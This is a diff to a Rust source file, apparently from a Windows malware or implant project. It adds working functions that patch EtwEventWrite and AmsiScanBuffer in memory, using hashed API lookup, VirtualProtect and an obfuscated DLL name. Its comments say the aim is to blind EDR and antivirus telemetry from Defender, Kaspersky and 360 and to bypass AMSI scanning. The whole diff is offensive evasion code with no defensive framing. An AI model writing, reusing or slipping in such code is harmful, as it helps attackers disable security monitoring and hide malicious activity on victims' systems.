@@ -355,3 +355,74 @@ pub unsafe fn get_api_addr(module_ptr: usize, func_hash: u32) -> Option<usize> {
     }
     None
 }
+
+// --- ETW and AMSI Patching (Direct memory manipulation) ---
+
+/// Patches ETW (Event Tracing for Windows) to blind EDR/AV telemetry.
+/// This prevents Kaspersky, 360, and Defender from logging our system calls.
+pub fn patch_etw() {
+    #[cfg(windows)]
+    unsafe {
+        let h_kernel32 = get_module_base(hash_module_name(b"kernel32.dll"));
+        if h_kernel32 == 0 { return; }
+        let vp_proc = get_api_addr(h_kernel32, hash_api_name(b"VirtualProtect"));
+        
+        let h_ntdll = get_module_base(hash_module_name(b"ntdll.dll"));
+        let etw_proc = get_api_addr(h_ntdll, hash_api_name(b"EtwEventWrite"));
+        
+        if let (Some(vp_addr), Some(etw_addr)) = (vp_proc, etw_proc) {
+            let virtual_protect: unsafe extern "system" fn(*mut winapi::ctypes::c_void, usize, u32, *mut u32) -> i32 = std::mem::transmute(vp_addr);
+            
+            let mut old_protect = 0;
+            // 0x40 = PAGE_EXECUTE_READWRITE
+            if virtual_protect(etw_addr as *mut _, 1, 0x40, &mut old_protect) != 0 {
+                #[cfg(target_arch = "x86_64")]
+                let patch: [u8; 1] = [0xC3]; // ret -> instantly returns 0 (success)
+                
+                #[cfg(target_arch = "x86")]
+                let patch: [u8; 3] = [0xC2, 0x14, 0x00]; // ret 14h
+                
+                std::ptr::copy_nonoverlapping(patch.as_ptr(), etw_addr as *mut u8, patch.len());
+                
+                // Restore original protection
+                virtual_protect(etw_addr as *mut _, 1, old_protect, &mut old_protect);
+            }
+        }
+    }
+}
+
+/// Patches AMSI (Anti-Malware Scan Interface) to bypass memory scanning from local AVs.
+pub fn patch_amsi() {
+    #[cfg(windows)]
+    unsafe {
+        let h_kernel32 = get_module_base(hash_module_name(b"kernel32.dll"));
+        let load_lib_proc = get_api_addr(h_kernel32, hash_api_name(b"LoadLibraryA"));
+        let vp_proc = get_api_addr(h_kernel32, hash_api_name(b"VirtualProtect"));
+        
+        if let (Some(load_lib_addr), Some(vp_addr)) = (load_lib_proc, vp_proc) {
+            let load_library: unsafe extern "system" fn(*const i8) -> usize = std::mem::transmute(load_lib_addr);
+            let virtual_protect: unsafe extern "system" fn(*mut winapi::ctypes::c_void, usize, u32, *mut u32) -> i32 = std::mem::transmute(vp_addr);
+            
+            // Load amsi.dll dynamically without String signature
+            let amsi_name = crate::utils::decode_obf(&crate::obf_str!("amsi.dll\0"));
+            let h_amsi = load_library(amsi_name.as_ptr() as *const i8);
+            if h_amsi != 0 {
+                let amsi_scan_proc = get_api_addr(h_amsi, hash_api_name(b"AmsiScanBuffer"));
+                if let Some(amsi_scan_addr) = amsi_scan_proc {
+                    let mut old_protect = 0;
+                    if virtual_protect(amsi_scan_addr as *mut _, 1, 0x40, &mut old_protect) != 0 {
+                        // Return AMSI_RESULT_INVALIDARG (0x80070057) to skip scan
+                        #[cfg(target_arch = "x86_64")]
+                        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]; 
+                        
+                        #[cfg(target_arch = "x86")]
+                        let patch: [u8; 8] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00];
+                        
+                        std::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan_addr as *mut u8, patch.len());
+                        virtual_protect(amsi_scan_addr as *mut _, 1, old_protect, &mut old_protect);
+                    }
+                }
+            }
+        }
+    }
+}
